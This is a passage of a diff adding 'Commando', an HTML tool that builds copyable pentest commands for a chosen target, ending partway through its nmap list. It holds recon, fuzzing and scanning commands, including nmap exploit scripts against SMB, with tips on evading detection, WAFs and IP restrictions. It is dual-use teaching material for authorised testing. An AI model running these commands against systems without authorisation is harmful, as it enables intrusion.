@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Commando — Real-Time Pentesting Command Compiler</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#f4f3ee;--text:#3d3a35;--muted:#8a8478;--border:#d6d1c4;--accent:#1b4332;--accent-light:#2d6a4f;--card:#ffffff;--code-bg:#1a1a1a;--code-text:#e0ddd5;--hover:#eae7df;--sidebar-w:220px}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--text);display:flex;min-height:100vh;font-size:14px;-webkit-font-smoothing:antialiased}
+#sidebar{width:var(--sidebar-w);min-width:var(--sidebar-w);background:var(--card);border-right:1px solid var(--border);display:flex;flex-direction:column;position:fixed;top:0;bottom:0;overflow-y:auto;z-index:10;transition:transform .25s ease}
+#sidebar.collapsed{transform:translateX(calc(var(--sidebar-w)*-1))}
+.sidebar-header{padding:20px 20px 16px;border-bottom:1px solid var(--border)}
+.sidebar-header h1{font-size:13px;font-weight:700;letter-spacing:2.5px;text-transform:uppercase;color:var(--accent)}
+.sidebar-header p{font-size:10px;color:var(--muted);margin-top:4px;letter-spacing:.5px}
+.sidebar-section{padding:12px 0}
+.sidebar-section-label{font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--muted);padding:0 20px 8px}
+.tool-btn{display:block;width:100%;padding:9px 20px;border:none;background:none;text-align:left;font-size:12.5px;color:var(--text);cursor:pointer;transition:all .12s;font-family:inherit;letter-spacing:.2px}
+.tool-btn:hover{background:var(--hover);color:var(--accent)}
+.tool-btn.active{background:var(--accent);color:#fff;font-weight:600}
+#main{margin-left:var(--sidebar-w);flex:1;display:flex;flex-direction:column;transition:margin .25s ease;min-width:0}
+#main.expanded{margin-left:0}
+#toggle-btn{position:fixed;top:12px;left:12px;z-index:20;background:var(--accent);color:#fff;border:none;border-radius:4px;width:34px;height:34px;cursor:pointer;font-size:15px;display:none;font-family:inherit}
+#sidebar.collapsed~#main #toggle-btn{display:flex;align-items:center;justify-content:center}
+#context-bar{position:sticky;top:0;z-index:5;background:var(--card);border-bottom:1px solid var(--border);padding:16px 28px}
+.ctx-label{font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--muted);margin-bottom:12px}
+.ctx-row{display:flex;gap:12px;align-items:flex-end;flex-wrap:wrap}
+.ctx-field{display:flex;flex-direction:column;gap:4px;flex:1;min-width:200px}
+.ctx-field span{font-size:10px;color:var(--muted);font-weight:600;letter-spacing:.5px;text-transform:uppercase}
+.ctx-field input[type="text"]{padding:9px 12px;border:1px solid var(--border);border-radius:5px;font-size:13px;background:var(--bg);color:var(--text);outline:none;font-family:inherit;transition:border .15s}
+.ctx-field input[type="text"]:focus{border-color:var(--accent)}
+.file-pick{display:flex;align-items:center;gap:10px}
+.file-pick label{padding:9px 16px;border:1px solid var(--border);border-radius:5px;cursor:pointer;font-size:12px;background:var(--bg);color:var(--text);font-weight:500;transition:border .15s;white-space:nowrap}
+.file-pick label:hover{border-color:var(--accent)}
+.file-pick .filename{font-size:11px;color:var(--accent);font-weight:500;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+#search-bar{padding:10px 28px;background:var(--card);border-bottom:1px solid var(--border)}
+#search-bar input{width:100%;padding:9px 12px;border:1px solid var(--border);border-radius:5px;font-size:13px;background:var(--bg);color:var(--text);outline:none;font-family:inherit;transition:border .15s}
+#search-bar input:focus{border-color:var(--accent)}
+#search-bar input::placeholder{color:var(--muted)}
+#workspace{padding:24px 28px;display:grid;grid-template-columns:repeat(auto-fill,minmax(480px,1fr));gap:16px;overflow-y:auto;flex:1}
+.card{background:var(--card);border:1px solid var(--border);border-radius:6px;overflow:hidden;transition:box-shadow .15s}
+.card:hover{box-shadow:0 2px 12px rgba(0,0,0,.06)}
+.card-head{padding:11px 16px;font-size:11px;font-weight:700;color:var(--text);border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;letter-spacing:.3px;text-transform:uppercase}
+.card-tag{font-size:9px;padding:2px 8px;border-radius:3px;background:var(--bg);color:var(--muted);font-weight:600;letter-spacing:.5px}
+.card-body{position:relative;background:var(--code-bg);padding:14px 16px;padding-right:70px}
+.card-body pre{font-family:'SF Mono','Fira Code',Consolas,'Courier New',monospace;font-size:12px;line-height:1.7;white-space:pre-wrap;word-break:break-all;color:var(--code-text);outline:none;min-height:20px;cursor:text;border:1px solid transparent;border-radius:3px;padding:2px 4px;margin:-2px -4px;transition:border .15s}
+.card-body pre:focus{border-color:#2d6a4f}
+.copy-btn{position:absolute;top:10px;right:10px;background:transparent;color:#777;border:1px solid #444;border-radius:4px;padding:4px 10px;font-size:10px;cursor:pointer;font-family:inherit;font-weight:600;letter-spacing:.5px;text-transform:uppercase;transition:all .15s}
+.copy-btn:hover{color:#ccc;border-color:#888}
+.copy-btn.copied{color:#2d6a4f;border-color:#2d6a4f}
+.card-desc{padding:10px 16px;font-size:11.5px;line-height:1.6;color:var(--muted);border-top:1px solid var(--border);background:var(--bg)}
+.empty-state{grid-column:1/-1;text-align:center;padding:60px 20px;color:var(--muted);font-size:13px}
+@media(max-width:768px){
+#sidebar{position:fixed;z-index:20}
+#main{margin-left:0!important}
+#toggle-btn{display:flex!important;align-items:center;justify-content:center}
+#workspace{grid-template-columns:1fr;padding:16px}
+.ctx-row{flex-direction:column}
+.ctx-field{min-width:0}
+}
+</style>
+</head>
+<body>
+<nav id="sidebar">
+<div class="sidebar-header">
+<h1>Commando</h1>
+<p>Pentesting Command Compiler</p>
+</div>
+<div class="sidebar-section">
+<div class="sidebar-section-label">Recon &amp; Web</div>
+<button class="tool-btn" data-tool="Subfinder">Subfinder</button>
+<button class="tool-btn" data-tool="Amass">Amass</button>
+<button class="tool-btn" data-tool="Httpx">Httpx</button>
+<button class="tool-btn" data-tool="Ffuf">Ffuf</button>
+<button class="tool-btn" data-tool="Dirsearch">Dirsearch</button>
+<button class="tool-btn" data-tool="Gobuster">Gobuster</button>
+</div>
+<div class="sidebar-section">
+<div class="sidebar-section-label">Scanning &amp; Exploit</div>
+<button class="tool-btn" data-tool="Nmap">Nmap</button>
+<button class="tool-btn" data-tool="Naabu">Naabu</button>
+<button class="tool-btn" data-tool="Nuclei">Nuclei</button>
+<button class="tool-btn" data-tool="Sqlmap">Sqlmap</button>
+<button class="tool-btn" data-tool="Commix">Commix</button>
+<button class="tool-btn" data-tool="Msfvenom">Msfvenom</button>
+</div>
+<div class="sidebar-section">
+<div class="sidebar-section-label">Cracking &amp; Brute</div>
+<button class="tool-btn" data-tool="Hydra">Hydra</button>
+<button class="tool-btn" data-tool="John">John the Ripper</button>
+<button class="tool-btn" data-tool="Hashcat">Hashcat</button>
+</div>
+</nav>
+<div id="main">
+<button id="toggle-btn" onclick="document.getElementById('sidebar').classList.toggle('collapsed');document.getElementById('main').classList.toggle('expanded')">&#9776;</button>
+<div id="context-bar">
+<div class="ctx-label">Machine Context Engine</div>
+<div class="ctx-row">
+<div class="ctx-field">
+<span>Target Host / IP / Domain</span>
+<input type="text" id="v-target" placeholder="e.g. 10.10.10.25 or target.com" oninput="render()">
+</div>
+<div class="ctx-field" style="flex:0 0 auto;min-width:0">
+<span>Wordlist</span>
+<div class="file-pick">
+<label>Browse<input type="file" style="display:none" onchange="pickFile(this)"></label>
+<span class="filename" id="wl-name">/usr/share/wordlists/rockyou.txt</span>
+</div>
+</div>
+</div>
+</div>
+<div id="search-bar"><input id="search" placeholder="Filter commands, flags, techniques..." oninput="render()"></div>
+<div id="workspace"></div>
+</div>
+<script>
+var STATE={target:'target.com',wordlist:'/usr/share/wordlists/rockyou.txt'};
+function $(id){return document.getElementById(id)}
+function pickFile(el){var f=el.files[0];if(f){STATE.wordlist=f.name;$('wl-name').textContent=f.name;render()}}
+function compile(s){var t=$('v-target').value||'target.com';STATE.target=t;return s.replace(/\$T/g,t).replace(/\$WL/g,STATE.wordlist)}
+
+var TOOLS={
+Subfinder:{cat:'Recon',cmds:[
+{t:'Basic Subdomain Enumeration',c:'subfinder -d $T -o subs.txt',d:'Runs subfinder against the target domain using all default sources and saves discovered subdomains to a file. This is the simplest starting point for any subdomain enumeration workflow.'},
+{t:'Silent Output for Piping',c:'subfinder -d $T -silent',d:'Suppresses all banner and status output, printing only raw subdomains to stdout. This makes it perfect for piping into other tools like httpx or naabu in a chain.'},
+{t:'All Sources Recursive',c:'subfinder -d $T -all -recursive -o deep_subs.txt',d:'Enables every available data source and performs recursive enumeration, finding subdomains of subdomains. This is the most thorough but slowest mode available.'},
+{t:'Pipe to Httpx Alive Check',c:'subfinder -d $T -silent | httpx -mc 200',d:'Discovers subdomains and immediately pipes them into httpx to check which ones are live and returning HTTP 200. This gives you an instant list of active web targets.'},
+{t:'JSON Structured Output',c:'subfinder -d $T -json -o subs.json',d:'Outputs results in JSON format with metadata like the source that found each subdomain. Useful for programmatic parsing or feeding into automated pipelines.'},
+{t:'Custom Resolvers',c:'subfinder -d $T -rL resolvers.txt -o resolved_subs.txt',d:'Uses a custom list of DNS resolvers instead of system defaults. This helps bypass rate limiting and improves accuracy when default resolvers return inconsistent results.'},
+{t:'Multiple Domain Input',c:'subfinder -dL domains.txt -all -o all_subs.txt',d:'Reads multiple target domains from a file and enumerates subdomains for all of them in one run. Efficient for bug bounty programs with large scopes.'},
+{t:'Rate Limited Stealth',c:'subfinder -d $T -rate-limit 5 -t 10 -silent',d:'Limits requests to 5 per second with 10 threads to stay under detection thresholds. Use this when you need to be quiet and avoid triggering rate limits on sources.'},
+{t:'Exclude Specific Sources',c:'subfinder -d $T -es github,virustotal -silent',d:'Excludes specific data sources from the enumeration. Useful when certain sources are slow, unreliable, or you want to avoid API quota consumption.'},
+{t:'Include Only Specific Sources',c:'subfinder -d $T -s crtsh,hackertarget -silent',d:'Restricts enumeration to only the named sources. Use this when you know which sources are most productive for your target or have limited API keys.'},
+{t:'Config File with API Keys',c:'subfinder -d $T -all -config provider-config.yaml -o subs.txt',d:'Loads a config file containing API keys for premium sources like Shodan, SecurityTrails, and Censys. This dramatically increases the number of discovered subdomains.'},
+{t:'Pipe to Naabu Port Scan',c:'subfinder -d $T -silent | naabu -silent -p 80,443,8080,8443',d:'Chains subdomain discovery directly into port scanning. Each discovered subdomain is immediately checked for open web ports, building a target list in one pipeline.'},
+{t:'Version and Provider Check',c:'subfinder -d $T -cs -v',d:'Runs in verbose mode and shows which sources contributed each result. Helpful for debugging your configuration and seeing which API keys are working.'},
+{t:'Timeout and Max Enum Time',c:'subfinder -d $T -timeout 30 -max-time 10 -o subs.txt',d:'Sets a 30-second timeout per source and a 10-minute maximum total runtime. Prevents the tool from hanging on slow sources during time-sensitive engagements.'},
+{t:'Match and Filter',c:'subfinder -d $T -silent -match "api,dev,staging"',d:'Filters output to only show subdomains containing specific keywords. Quickly isolates high-value targets like API endpoints, development servers, or staging environments.'},
+]},
+Amass:{cat:'Recon',cmds:[
+{t:'Passive Enumeration',c:'amass enum -passive -d $T -o amass_passive.txt',d:'Collects subdomains using only passive data sources like certificate transparency logs and search engines. No direct contact is made with the target infrastructure.'},
+{t:'Active with Brute Force',c:'amass enum -active -brute -d $T -o amass_brute.txt',d:'Performs active DNS resolution and brute-forces subdomain names using a built-in wordlist. This directly queries the target DNS servers and will be detected.'},
+{t:'Active with IP Resolution',c:'amass enum -active -d $T -ip -o amass_resolved.txt',d:'Resolves each discovered subdomain to its IP address and includes it in the output. Useful for identifying shared hosting and mapping infrastructure.'},
+{t:'Intel WHOIS Reverse',c:'amass intel -d $T -whois',d:'Uses WHOIS data to find other domains registered by the same organization. Discovers related assets that may share infrastructure or credentials with your target.'},
+{t:'Intel ASN Enumeration',c:'amass intel -asn 15169 -o asn_assets.txt',d:'Enumerates all domains and netblocks associated with a specific ASN number. Replace the ASN with your target organization to map their entire IP space.'},
+{t:'Multiple Domain File Input',c:'amass enum -df domains.txt -passive -o multi.txt',d:'Reads multiple root domains from a file and enumerates subdomains for each. Saves time when working on programs with many in-scope domains.'},
+{t:'Config File Driven',c:'amass enum -d $T -config amass_config.yaml -o configured.txt',d:'Uses a YAML configuration file to set API keys, brute force settings, and scope restrictions. Essential for getting maximum results from premium data sources.'},
+{t:'Minimal No Recursion',c:'amass enum -passive -norecursive -d $T',d:'Disables recursive subdomain discovery for a faster, surface-level scan. Use this when you need quick results or the target has an extremely large subdomain space.'},
+{t:'Brute with Custom Wordlist',c:'amass enum -active -brute -w $WL -d $T -o brute_custom.txt',d:'Uses your own wordlist for subdomain brute forcing instead of the default list. Custom wordlists tailored to the target industry dramatically improve discovery rates.'},
+{t:'Track Historical Changes',c:'amass track -d $T -last 5',d:'Compares the current subdomain footprint against the last 5 stored enumerations. Highlights new, removed, and changed subdomains for continuous monitoring.'},
+{t:'D3 Graph Visualization',c:'amass viz -d3 -d $T -o amass_graph.html',d:'Generates an interactive D3.js HTML graph showing relationships between discovered domains, IPs, and ASNs. Great for presentations and understanding infrastructure topology.'},
+{t:'Enum with Min and Max DNS',c:'amass enum -d $T -min-for-recursive 3 -o recursive.txt',d:'Only performs recursive enumeration on subdomains that have at least 3 discovered children. Prevents wasting time recursing into dead-end branches.'},
+{t:'Output as JSON',c:'amass enum -passive -d $T -json amass.json',d:'Exports full results with metadata in JSON format including sources, IP addresses, and relationships. Ideal for importing into databases or custom analysis scripts.'},
+{t:'Scripting Engine',c:'amass enum -d $T -scripts /path/to/scripts/ -o scripted.txt',d:'Loads custom Amass scripts that define additional data sources or processing logic. Extends Amass functionality beyond its built-in capabilities.'},
+{t:'Alterations and Permutations',c:'amass enum -d $T -alts -o alterations.txt',d:'Generates subdomain name permutations by altering discovered names with common patterns like dev-, staging-, and -api. Finds subdomains that pure brute force misses.'},
+]},
+Httpx:{cat:'Recon',cmds:[
+{t:'Probe for Live Hosts',c:'cat subs.txt | httpx -mc 200,301,302 -o alive.txt',d:'Takes a list of subdomains and checks which ones have active web servers responding with success or redirect codes. Quickly filters thousands of subdomains to actionable targets.'},
+{t:'Title and Status Code',c:'cat subs.txt | httpx -title -status-code -content-length',d:'Displays the HTML page title, HTTP status code, and content length for each host. Helps you quickly identify login pages, default installs, and interesting applications.'},
+{t:'Full Recon Chain',c:'echo $T | httpx -title -sc -cl -ct -location -favicon -tech-detect',d:'Extracts maximum information from a single target including title, status, content type, redirect location, favicon hash, and detected technologies. A complete web fingerprint in one command.'},
+{t:'Tech Detection Only',c:'cat subs.txt | httpx -tech-detect -mc 200',d:'Identifies web technologies like frameworks, CMS platforms, and server software running on each live host. Knowing the tech stack helps you choose the right attack vectors.'},
+{t:'TLS Certificate Grab',c:'echo $T | httpx -tls-grab -tls-probe -json',d:'Extracts TLS certificate details including subject, issuer, SANs, and expiry dates. Certificate data often reveals internal hostnames and organizational structure.'},
+{t:'Screenshot Capture',c:'cat subs.txt | httpx -screenshot -system-chrome -o screens/',d:'Takes browser screenshots of every live web target using Chrome. Visual inspection of hundreds of sites at once helps identify interesting or misconfigured applications.'},
+{t:'JSON Structured Output',c:'cat subs.txt | httpx -json -o httpx_results.json',d:'Outputs all probe data in structured JSON format for programmatic processing. Each entry contains the full response metadata for analysis in custom scripts.'},
+{t:'Custom Header Injection',c:'cat subs.txt | httpx -H "X-Forwarded-For: 127.0.0.1" -mc 200',d:'Adds a custom header to every request, useful for testing header-based access controls or bypassing IP restrictions by spoofing internal addresses.'},
+{t:'Follow Redirects',c:'cat subs.txt | httpx -follow-redirects -sc -title -location',d:'Follows HTTP redirects and shows the final destination along with intermediate status codes. Reveals where redirects actually land and catches interesting redirect chains.'},
+{t:'High Speed Pipeline',c:'cat subs.txt | httpx -threads 100 -rl 200 -o fast.txt',d:'Runs with 100 concurrent threads and a rate limit of 200 requests per second. Use this for large target lists when speed matters more than stealth.'},
+{t:'Filter by Content Match',c:'cat subs.txt | httpx -mc 200 -match-string "admin"',d:'Only shows responses that contain the word "admin" in the body. Quickly finds admin panels, login pages, and management interfaces across many hosts.'},
+{t:'Hash Response Body',c:'cat subs.txt | httpx -body-preview 100 -hash md5',d:'Shows the first 100 characters of each response body along with its MD5 hash. Identical hashes indicate default pages, making it easy to spot unique or interesting content.'},
+{t:'Extract CNAME Records',c:'cat subs.txt | httpx -cname -o cnames.txt',d:'Extracts CNAME records for each host, revealing third-party services and potential subdomain takeover opportunities when CNAMEs point to unclaimed resources.'},
+{t:'Path Probing',c:'cat subs.txt | httpx -path "/admin,/login,/.git" -mc 200,403',d:'Appends specific paths to each host and checks if they exist. A fast way to find exposed admin panels, login forms, or accidentally published git repositories.'},
+{t:'Filter by Content Length',c:'cat subs.txt | httpx -mc 200 -ml 100',d:'Filters results to only show responses with at least 100 lines of content. Eliminates empty or placeholder pages and focuses on hosts with actual application content.'},
+]},
+Ffuf:{cat:'Web',cmds:[
+{t:'Directory Discovery',c:'ffuf -u https://$T/FUZZ -w $WL -mc 200,301,302,403',d:'Brute forces directory and file names on the target web server. The FUZZ keyword is replaced with each word from the wordlist, revealing hidden paths and resources.'},
+{t:'Virtual Host Enumeration',c:'ffuf -u https://$T -H "Host: FUZZ.$T" -w $WL -fs 0',d:'Discovers virtual hosts by fuzzing the Host header. Different vhosts may serve completely different applications on the same IP. The -fs 0 filters empty responses.'},
+{t:'GET Parameter Fuzzing',c:'ffuf -u "https://$T/page?FUZZ=value" -w $WL -mc 200',d:'Discovers hidden GET parameters by fuzzing parameter names. Many applications have undocumented parameters that can lead to debug modes or hidden functionality.'},
+{t:'POST Body Fuzzing',c:'ffuf -u https://$T/login -X POST -d "username=FUZZ&password=FUZZ" -w $WL -fc 401',d:'Fuzzes POST form fields with wordlist entries while filtering out 401 responses. Useful for testing login forms and discovering valid usernames through response differences.'},
+{t:'Extension Brute Force',c:'ffuf -u https://$T/FUZZ -w $WL -e .php,.bak,.txt,.html,.asp,.jsp,.old,.conf',d:'Appends multiple file extensions to each wordlist entry. This catches backup files, config files, and scripts in different languages that might be left on the server.'},
+{t:'Recursive Discovery',c:'ffuf -u https://$T/FUZZ -w $WL -recursion -recursion-depth 4 -mc 200,301',d:'When a directory is found, ffuf automatically starts fuzzing inside it up to 4 levels deep. Discovers deeply nested paths that a single-level scan would miss.'},
+{t:'Rate Limited Stealth',c:'ffuf -u https://$T/FUZZ -w $WL -rate 30 -mc 200',d:'Limits requests to 30 per second to avoid triggering WAF rules or rate limiters. Slower but much less likely to get your IP blocked during an engagement.'},
+{t:'Filter by Word Count',c:'ffuf -u https://$T/FUZZ -w $WL -fw 42 -mc all',d:'Accepts all status codes but filters out responses with exactly 42 words. Use this when the server returns custom error pages that all have the same word count.'},
+{t:'Filter by Response Size',c:'ffuf -u https://$T/FUZZ -w $WL -fs 1234 -mc all',d:'Filters out responses of a specific byte size. When a custom 404 page always returns the same size, this eliminates all false positives in one flag.'},
+{t:'Filter by Line Count',c:'ffuf -u https://$T/FUZZ -w $WL -fl 10 -mc all',d:'Removes responses with a specific line count from results. Another method to filter out consistent error pages when size and word count vary slightly.'},
+{t:'Multi Wordlist Cluster',c:'ffuf -u https://$T/W1/W2 -w $WL:W1 -w params.txt:W2 -mc 200',d:'Uses two wordlists simultaneously, creating combinations of both. FUZZ keywords W1 and W2 are replaced independently, enabling multi-position fuzzing in one scan.'},
+{t:'Cookie Authenticated',c:'ffuf -u https://$T/FUZZ -w $WL -b "session=abc123;token=xyz" -mc 200',d:'Includes authentication cookies with every request to fuzz behind login pages. Replace the cookie values with a valid session from your browser to scan authenticated areas.'},
+{t:'Header Fuzzing',c:'ffuf -u https://$T/ -H "X-Custom: FUZZ" -w $WL -mc 200',d:'Fuzzes a custom HTTP header value to discover header-based functionality or bypasses. Some applications change behavior based on specific header values.'},
+{t:'HTTP Method Fuzzing',c:'ffuf -u https://$T/api/resource -X FUZZ -w methods.txt -mc all -fc 405',d:'Tests different HTTP methods (GET, POST, PUT, DELETE, PATCH) against an endpoint. May reveal methods that bypass access controls or expose hidden API functionality.'},
+{t:'Output to JSON',c:'ffuf -u https://$T/FUZZ -w $WL -mc 200 -o results.json -of json',d:'Saves all results in JSON format for later analysis or importing into other tools. The structured output includes request and response details for each finding.'},
+{t:'Subdomain via DNS',c:'ffuf -u https://FUZZ.$T -w $WL -mc 200,301',d:'Discovers subdomains by placing the FUZZ keyword in the subdomain position. An alternative to dedicated subdomain tools when you want to test specific wordlists.'},
+{t:'Proxy Through Burp',c:'ffuf -u https://$T/FUZZ -w $WL -x http://127.0.0.1:8080',d:'Routes all traffic through a proxy like Burp Suite for inspection. Lets you see the raw requests and responses while ffuf does the automated fuzzing.'},
+{t:'Replay Proxy for Matches',c:'ffuf -u https://$T/FUZZ -w $WL -mc 200 -replay-proxy http://127.0.0.1:8080',d:'Only sends matching results through the proxy, keeping the proxy history clean. You get the speed of direct scanning with proxy capture of interesting findings only.'},
+]},
+Dirsearch:{cat:'Web',cmds:[
+{t:'Basic Directory Scan',c:'dirsearch -u https://$T -w $WL',d:'Performs a standard directory brute force scan using your wordlist. Dirsearch has smart detection of custom 404 pages and automatically filters false positives.'},
+{t:'Extension Filtering',c:'dirsearch -u https://$T -e php,asp,aspx,jsp,html,txt,bak,old',d:'Tests each wordlist entry with multiple file extensions appended. Covers common web technologies and backup file patterns that developers often leave exposed.'},
+{t:'Recursive Deep Scan',c:'dirsearch -u https://$T -r -R 5',d:'Recursively scans discovered directories up to 5 levels deep. When /admin/ is found, it automatically starts scanning /admin/FUZZ to find nested content.'},
+{t:'Threaded with Delay',c:'dirsearch -u https://$T -t 60 --delay 0.05',d:'Uses 60 threads with a 50ms delay between requests per thread. Balances speed and stealth to avoid overwhelming the target or triggering rate limits.'},
+{t:'Exclude Status Codes',c:'dirsearch -u https://$T -x 403,404,500,503',d:'Hides responses with these status codes from the output. Useful when the server returns many 403 forbidden responses that clutter your results.'},
+{t:'Custom Header Auth',c:'dirsearch -u https://$T --header "Authorization: Bearer tok123"',d:'Adds an authentication header to every request for scanning protected areas. Use a valid token from your authorized session to discover paths behind authentication.'},
+{t:'Cookie Injection',c:'dirsearch -u https://$T --cookie "session=abc123"',d:'Includes a session cookie with requests to scan as an authenticated user. This reveals directories and files that are only visible after logging in.'},
+{t:'Proxy Through Burp',c:'dirsearch -u https://$T --proxy http://127.0.0.1:8080',d:'Sends all requests through a proxy for manual inspection. Essential for understanding server behavior and debugging false positives during directory discovery.'},
+{t:'Force Extensions',c:'dirsearch -u https://$T -f -e php,html,js',d:'Forces the specified extensions on every wordlist entry, even if the entry already has an extension. Ensures comprehensive coverage of all possible file variations.'},
+{t:'Subdirectory Targeted',c:'dirsearch -u https://$T/api/v1/ -w $WL -e json,xml',d:'Targets a specific subdirectory with API-focused extensions. Use this when you have already identified an API base path and want to enumerate its endpoints.'},
+{t:'Plain Text Output',c:'dirsearch -u https://$T --format plain -o results.txt',d:'Saves results in a clean plain text format with one URL per line. Easy to process with standard Unix tools like grep, sort, and awk.'},
+{t:'JSON Output',c:'dirsearch -u https://$T --format json -o results.json',d:'Exports results in structured JSON format with status codes, sizes, and redirect locations. Best for feeding into automated analysis pipelines.'},
+{t:'Random User Agents',c:'dirsearch -u https://$T --random-agent',d:'Rotates through different browser user-agent strings with each request. Helps evade basic WAF rules that block scanning tools based on their default user-agent.'},
+{t:'Follow Redirects',c:'dirsearch -u https://$T --follow-redirects',d:'Follows HTTP redirects and reports the final destination. Reveals where restricted paths redirect to and can expose the actual login or error pages.'},
+{t:'Custom Wordlist with Prefixes',c:'dirsearch -u https://$T -w $WL --prefixes .,.~',d:'Adds dot and tilde prefixes to wordlist entries to find hidden files and editor backup files. Files like .htaccess and ~backup are commonly exposed.'},
+{t:'Suffixes Scan',c:'dirsearch -u https://$T -w $WL --suffixes /,~,.bak,.old',d:'Appends suffixes to discover backup copies and directory listings. Developers often create .bak or .old copies of files that contain sensitive information.'},
+]},
+Gobuster:{cat:'Web',cmds:[
+{t:'Directory Brute Force',c:'gobuster dir -u https://$T -w $WL -t 50',d:'Performs fast directory enumeration using 50 concurrent threads. Gobuster is written in Go and is one of the fastest brute forcers available for large wordlists.'},
+{t:'DNS Subdomain Enum',c:'gobuster dns -d $T -w $WL -t 50',d:'Brute forces subdomain names through DNS resolution. Each wordlist entry is prepended to the domain and resolved, revealing subdomains that passive sources miss.'},
+{t:'Vhost Discovery',c:'gobuster vhost -u https://$T -w $WL --append-domain',d:'Discovers virtual hosts by testing different Host header values. The append-domain flag automatically adds the base domain to each wordlist entry.'},
+{t:'Extension Search',c:'gobuster dir -u https://$T -w $WL -x php,html,txt,bak,asp,jsp',d:'Tests each wordlist entry with multiple file extensions. This multiplies your coverage and catches files in different languages that may be running on the server.'},
+{t:'Status Code Filter',c:'gobuster dir -u https://$T -w $WL -s 200,204,301,302,307',d:'Only shows results matching specific status codes. Focuses your output on successful and redirect responses while hiding errors and forbidden pages.'},
+{t:'Negative Status Filter',c:'gobuster dir -u https://$T -w $WL -b 404,403,500',d:'Blacklists specific status codes from the output. The inverse of positive filtering, useful when you want to see everything except common error responses.'},
+{t:'Wildcard Force',c:'gobuster dir -u https://$T -w $WL --wildcard',d:'Forces gobuster to continue even when wildcard responses are detected. Some servers return 200 for every path, and this flag lets you scan through that behavior.'},
+{t:'Cookie Auth',c:'gobuster dir -u https://$T -w $WL -c "session=abc123"',d:'Includes an authentication cookie with every request. Use this to enumerate directories and files that are only accessible to logged-in users.'},
+{t:'Custom Header',c:'gobuster dir -u https://$T -w $WL -H "Authorization: Bearer tok"',d:'Adds a custom header like an API token or bearer token to each request. Essential for scanning API endpoints that require token-based authentication.'},
+{t:'Proxy Routing',c:'gobuster dir -u https://$T -w $WL --proxy http://127.0.0.1:8080',d:'Routes traffic through a proxy like Burp Suite. Allows you to inspect gobuster traffic and manually verify interesting findings in real-time.'},
+{t:'No TLS Verification',c:'gobuster dir -u https://$T -w $WL -k -t 60',d:'Skips TLS certificate verification, allowing scanning of targets with self-signed or expired certificates. Common in internal networks and development environments.'},
+{t:'S3 Bucket Enumeration',c:'gobuster s3 -w $WL',d:'Enumerates Amazon S3 bucket names by testing wordlist entries as bucket names. Discovers publicly accessible buckets that may contain sensitive data or backups.'},
+{t:'Pattern File',c:'gobuster dir -u https://$T -w $WL -p pattern.txt',d:'Uses a pattern file to define placeholder replacements in the wordlist. Allows complex fuzzing patterns beyond simple word substitution.'},
+{t:'Expanded Output',c:'gobuster dir -u https://$T -w $WL -e -t 50',d:'Shows the full URL for each discovered path instead of just the relative path. Makes it easy to copy results directly into a browser or other tools.'},
+{t:'Quiet Mode with Output',c:'gobuster dir -u https://$T -w $WL -q -o gobuster.txt',d:'Suppresses the progress bar and banner for clean output saved to a file. Ideal for automation scripts where you only want the discovered paths.'},
+{t:'TFTP Enumeration',c:'gobuster tftp -s $T -w $WL',d:'Enumerates files on a TFTP server by testing wordlist entries as filenames. TFTP servers often contain network device configurations and firmware files.'},
+]},
+Nmap:{cat:'Scanning',cmds:[
+{t:'Fast Top 1000 SYN',c:'nmap -sS -T4 --top-ports 1000 $T',d:'Performs a SYN stealth scan on the 1000 most commonly used ports with aggressive timing. The fastest way to get a useful port overview of a target without completing TCP handshakes.'},
+{t:'Full TCP Port Scan',c:'nmap -sT -p- -T4 $T -oN tcp_full.txt',d:'Scans all 65535 TCP ports using full connect scans. The -sT flag completes the TCP handshake, which is slower but works without root privileges and is more reliable.'},
+{t:'Full SYN Stealth Scan',c:'nmap -sS -p- -T4 --min-rate 5000 $T -oN syn_full.txt',d:'Scans every port using SYN packets at a minimum rate of 5000 packets per second. This is the gold standard for fast, comprehensive port discovery with stealth.'},
+{t:'Version and Default Scripts',c:'nmap -sV -sC -p 21,22,25,53,80,110,139,143,443,445,993,995,3306,3389,8080 $T -oA enum',d:'Detects service versions and runs default NSE scripts against common ports. The -oA flag saves output in all three formats for flexible post-processing.'},
+{t:'Aggressive Full Recon',c:'nmap -A -T4 -p- $T -oN aggressive.txt',d:'Enables OS detection, version detection, script scanning, and traceroute on all ports. This is the most comprehensive single scan but is very noisy and easily detected.'},
+{t:'UDP Top 200 Scan',c:'nmap -sU --top-ports 200 -T4 $T -oN udp.txt',d:'Scans the top 200 UDP ports. UDP scanning is slow because there are no acknowledgments, but it reveals critical services like DNS, SNMP, and TFTP that TCP scans miss.'},
+{t:'UDP Full Scan',c:'nmap -sU -p- -T4 --min-rate 5000 $T -oN udp_full.txt',d:'Scans all 65535 UDP ports at high speed. This takes significantly longer than TCP scanning because UDP is connectionless and most ports simply do not respond.'},
+{t:'OS Detection',c:'nmap -O --osscan-guess --fuzzy $T',d:'Attempts to identify the operating system by analyzing TCP/IP stack fingerprints. The guess and fuzzy flags make it try harder when an exact match is not found.'},
+{t:'Vulnerability Script Audit',c:'nmap --script vuln -p 80,443 $T -oN vuln.txt',d:'Runs all NSE scripts in the vulnerability category against web ports. Checks for known vulnerabilities like Heartbleed, ShellShock, and common misconfigurations.'},
+{t:'Auth Script Audit',c:'nmap --script auth -p 21,22,23,25,110,143,445,3306 $T',d:'Runs authentication-related scripts that check for anonymous access, default credentials, and weak authentication configurations across common services.'},
+{t:'Exploit Script Audit',c:'nmap --script exploit -p 445,139 $T',d:'Runs exploit scripts against SMB ports to check for known vulnerabilities like EternalBlue. These scripts attempt safe exploitation to confirm vulnerabilities exist.'},
+{t:'Combined Script Categories',c:'nmap --script "vuln,exploit,auth" -p- $T -oN combined_scripts.txt',d:'Runs vulnerability, exploit, and authentication scripts simultaneously on all ports. Provides the most comprehensive automated vulnerability assessment nmap can deliver.'},
